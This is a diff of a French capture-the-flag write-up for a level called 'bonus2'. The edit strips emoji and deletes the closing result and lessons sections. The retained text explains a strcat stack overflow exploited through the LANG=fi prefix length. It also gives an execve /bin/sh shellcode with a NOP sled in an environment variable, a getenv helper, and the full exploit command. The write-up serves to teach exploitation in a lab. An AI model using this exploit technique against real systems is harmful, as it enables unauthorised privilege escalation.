@@ -8,7 +8,7 @@
 > l'**adresse de retour** tombe dans les 32 octets contrôlés de `argv[2]`. On y
 > place l'adresse d'un shellcode (variable d'env, NX désactivé) → shell `bonus3`.
 
-> ✅ **Protections vérifiées :** `readelf -l ./bonus2 | grep GNU_STACK` → `RWE`
+>  **Protections vérifiées :** `readelf -l ./bonus2 | grep GNU_STACK` → `RWE`
 > (pile exécutable, **NX désactivé**). On peut donc exécuter un shellcode sur la
 > pile / en variable d'environnement.
 
@@ -27,7 +27,7 @@ flowchart TD
     M --> G["greetuser : greeting = prefixe + strcat(name)"]
     G --> OF["strcat deborde le buffer → @retour de greetuser<br/>ecrasee par ARG2[18..21] = @shellcode"]
     OF --> RET["ret de greetuser → EIP = @shellcode"]
-    RET --> SH["NOP sled → shellcode → shell bonus3 💥"]
+    RET --> SH["NOP sled → shellcode → shell bonus3 "]
 
     style OF fill:#ffcdd2,stroke:#b71c1c
     style SH fill:#c8e6c9,stroke:#1b5e20
@@ -104,22 +104,22 @@ ANGLAIS (préfixe 6) :
 [Hello ][----- argv1 40 -----][===== argv2 32 =====]
 46 ──────────────────────────┘                  ↑
 ruban argv2 commence à 46     →  76-46 = index 30
-                                 adresse = 30,31,32,33 → 32,33 HORS ruban ❌
+                                 adresse = 30,31,32,33 → 32,33 HORS ruban 
 
 FINNOIS (préfixe 18) :
 [Hyvää päivää ][----- argv1 40 -----][===== argv2 32 =====]
 58 ────────────────────────────────┘          ↑
 ruban argv2 commence à 58     →  76-58 = index 18
-                                 adresse = 18,19,20,21 → tout DEDANS ✅
+                                 adresse = 18,19,20,21 → tout DEDANS 
 ```
 
 Or on ne contrôle que **32 octets** de `argv[2]` (`strncpy(buf2, argv[2], 0x20)`),
 soit les indices `0..31` :
 
 - **anglais → `argv[2][30]`** : l'adresse (4 octets) irait de 30 à **33**, mais
-  32 et 33 ne sont **pas copiés** → adresse tronquée → **impossible** ❌
+  32 et 33 ne sont **pas copiés** → adresse tronquée → **impossible** 
 - **finnois → `argv[2][18]`** : l'adresse va de 18 à 21, **bien dans les 0..31**
-  → on peut l'écrire en entier → **OK** ✅
+  → on peut l'écrire en entier → **OK** 
 
 **Nuance contre-intuitive :** un préfixe plus long ne pousse PAS la cible plus
 loin — il fait **glisser le ruban `argv[2]` vers la droite**, donc le ruban
@@ -140,10 +140,10 @@ flowchart TD
     EN1 --> EN2["Étape 2 — index = 76 − 46<br/>= 30"]
     FI1 --> FI2["Étape 2 — index = 76 − 58<br/>= 18"]
 
-    EN2 --> EN3["adresse = 30..33<br/>32,33 HORS des 32 copiés ❌"]
-    FI2 --> FI3["adresse = 18..21<br/>tout DANS les 32 copiés ✅"]
+    EN2 --> EN3["adresse = 30..33<br/>32,33 HORS des 32 copiés "]
+    FI2 --> FI3["adresse = 18..21<br/>tout DANS les 32 copiés "]
 
-    LIM["⚠️ strncpy(buf2, argv[2], 0x20)<br/>copie SEULEMENT 32 octets : indices 0..31"]
+    LIM[" strncpy(buf2, argv[2], 0x20)<br/>copie SEULEMENT 32 octets : indices 0..31"]
     LIM -.borne.-> EN3
     LIM -.borne.-> FI3
 
@@ -175,7 +175,7 @@ export LANG=fi
 export SHELLCODE=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
 
 # 3. trouver l'adresse de SHELLCODE
-#    ⚠️ nom UNIQUE (/tmp/getenv appartient déjà à bonus0 -> Permission denied)
+#     nom UNIQUE (/tmp/getenv appartient déjà à bonus0 -> Permission denied)
 cat > /tmp/ge2.c << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
@@ -194,7 +194,7 @@ gcc /tmp/ge2.c -o /tmp/ge2 && /tmp/ge2
          $(python -c "import struct; print 'A'*18 + struct.pack('<I', $(/tmp/ge2) + 0x64) + 'A'*10")
 ```
 
-> ⚠️ La version automatique ci-dessus relit `/tmp/ge2` à chaque lancement, donc
+> l version automatique ci-dessus relit `/tmp/ge2` à chaque lancement, donc
 > elle reste juste même si l'adresse bouge. **N'écris jamais l'adresse en dur en
 > copiant un exemple** : l'adresse de l'env change quand l'environnement change.
 
@@ -208,33 +208,3 @@ Version **manuelle** équivalente (si tu veux voir l'adresse) :
 
 > Si ça crashe : l'écart `/tmp/ge2`↔`bonus2` dépasse la marge → agrandis le sled
 > (`'\x90'*1000`+), ou augmente le `+ 0x64` pour viser plus loin dans le sled.
-
-Résultat → shell aux droits de **bonus3** :
-
-```bash
-whoami          # → bonus3
-cat /home/user/bonus3/.pass
-```
-
-## Pièges rencontrés (et comment on les a résolus)
-
-| Symptôme | Cause | Fix |
-|---|---|---|
-| `Permission denied` sur `/tmp/getenv.c` | fichier déjà créé par bonus0 (sticky bit) | nom unique `/tmp/ge2` |
-| crash, `eip = 0x41414141` (des `A`) | **LE vrai bug** : offset faux. On visait `argv[2][22]`, mais la @retour lit `argv[2][18]` → `eip` recevait des `A` → saut dans le vide, quelle que soit l'adresse/le sled | motif gdb → vrai offset = **18** |
-| adresse `/tmp/ge2` ≠ adresse dans `bonus2` | l'emplacement de l'env varie (args, état du shell) | NOP sled (~200) + viser le **milieu** ; le sled pardonne l'écart |
-
-> 💡 On a longtemps cru que le sled était trop petit, mais c'était l'**offset**.
-> Un sled de 200 suffit dès que l'offset est bon — le sled n'absorbe que le petit
-> écart d'adresse, pas une erreur d'offset (qui, elle, fait rater à coup sûr).
-
-## Concepts à retenir
-
-| Concept | Explication |
-|---|---|
-| `$LANG` contrôlé par l'attaquant | choisit la longueur du préfixe → décale la cible dans `argv[2]` |
-| Préfixe UTF-8 | `ä` = 2 octets → le finnois est plus long → cible plus tôt → dans les 32 |
-| `strcat` sans borne | colle `name` après le préfixe → déborde le buffer de greetuser |
-| `strncpy(.., 0x20)` | limite `argv[2]` à 32 octets → contrainte : cible doit être ≤ 31 |
-| Offset trouvé via gdb | motif unique → `eip` révèle l'offset exact (`argv[2][18]`), plus fiable que le calcul |
-| NOP sled + env | un sled modeste (~200) suffit : il absorbe l'écart d'adresse helper↔cible, pas une erreur d'offset ; viser le milieu |
